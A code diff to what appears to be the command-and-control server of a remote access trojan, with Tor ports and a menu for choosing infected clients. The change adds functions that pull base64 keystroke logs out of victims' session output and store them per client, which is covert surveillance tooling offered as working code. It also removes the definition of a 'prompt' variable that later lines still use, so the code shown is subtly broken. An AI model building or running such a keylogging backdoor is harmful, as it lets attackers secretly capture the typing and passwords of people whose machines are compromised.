@@ -17,6 +17,25 @@ BUFFER_SIZE = 16384
 CONTROL_PORT = 19051
 SOCKS_PORT = 19050
 
+KEYLOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogs")
+
+def save_keylog(cid: int, data_b64: str):
+    os.makedirs(KEYLOG_DIR, exist_ok=True)
+    path = os.path.join(KEYLOG_DIR, f"client_{cid}", "keylog.txt")
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    try:
+        decoded = base64.b64decode(data_b64).decode(errors="replace")
+        with open(path, "a") as f:
+            f.write(decoded)
+    except Exception:
+        pass
+
+def extract_keylog_lines(cid: int, text: str):
+    for line in text.split("\n"):
+        line = line.strip()
+        if line.startswith("[keylog] "):
+            save_keylog(cid, line[9:])
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_DIR = os.path.dirname(BASE_DIR)
 CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
@@ -114,11 +133,13 @@ def parse_file_response(out):
             pass
     return None, None
 
-def interactive_session(conn, addr):
+def interactive_session(conn, addr, cid: int):
     initial = recv_until_prompt(conn)
     if initial is None:
         return False
-    print(initial.decode(errors="ignore"), end="", flush=True)
+    init_text = initial.decode(errors="ignore")
+    extract_keylog_lines(cid, init_text)
+    print(init_text, end="", flush=True)
     while True:
         try:
             line = input()
@@ -161,7 +182,7 @@ def interactive_session(conn, addr):
         if response is None:
             return False
         out = response.decode(errors="ignore")
-        prompt = ">> "
+        extract_keylog_lines(cid, out)
         if out.endswith(prompt):
             out = out[:-len(prompt)]
         out_clean = out.rstrip("\n")
@@ -369,7 +390,7 @@ def c2_menu(manager: ClientManager):
             print(f"[Selected client {cid}, entering interactive session]")
             print("[Type exit/quit to return to menu]")
             try:
-                alive = interactive_session(conn, addr)
+                alive = interactive_session(conn, addr, cid)
             except Exception as e:
                 print(f"Session error: {e}")
                 alive = False
